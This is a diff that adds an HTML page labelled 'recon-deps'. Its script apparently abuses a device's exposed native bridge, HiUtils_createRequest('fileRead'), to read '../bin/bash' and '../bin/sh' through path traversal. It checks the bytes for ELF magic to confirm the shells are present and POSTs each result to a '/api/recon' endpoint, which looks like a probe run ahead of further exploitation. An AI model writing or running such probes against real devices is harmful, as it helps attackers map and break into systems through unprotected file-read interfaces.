@@ -1,0 +1,44 @@
+<!doctype html>
+<!-- recon: postinst prerequisites. Read-only; raw error capture.
+     Binary files: only the first bytes matter (ELF magic vs ENOENT). -->
+<html><head><meta charset="utf-8"><title>recon-deps</title></head>
+<body><pre id="out">probing…</pre><script>
+(function () {
+  "use strict";
+  var out = document.getElementById("out");
+  var report = { started: new Date().toISOString(), files: {} };
+  function save(tag) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", "/api/recon", true);
+      x.setRequestHeader("Content-Type", "application/json");
+      x.send(JSON.stringify({ tag: tag, at: new Date().toISOString(), report: report }));
+    } catch (e) {}
+  }
+  function raw(path) {
+    try {
+      var r = HiUtils_createRequest("fileRead", { path: path, mode: 6 });
+      var msg = r.msg;
+      if (msg != null && typeof msg === "object") msg = JSON.stringify(msg);
+      var s = String(msg == null ? "" : msg);
+      // for binaries, show only the first 64 chars (ELF magic check)
+      return { ret: r.ret, head: s.slice(0, 64), len: s.length };
+    } catch (e) { return { exception: String(e) }; }
+  }
+  var TARGETS = ["../bin/bash", "../bin/sh"];
+  var i = 0;
+  report.files = {};
+  function next() {
+    if (i >= TARGETS.length) {
+      try { out.textContent = JSON.stringify(report, null, 1); } catch (e) {}
+      save("deps-end"); return;
+    }
+    var k = TARGETS[i].replace(/\.\.|\//g, "_");
+    report.files[k] = raw(TARGETS[i]);
+    save("deps-" + i);
+    i++;
+    setTimeout(next, 4000);
+  }
+  next();
+})();
+</script></body></html>
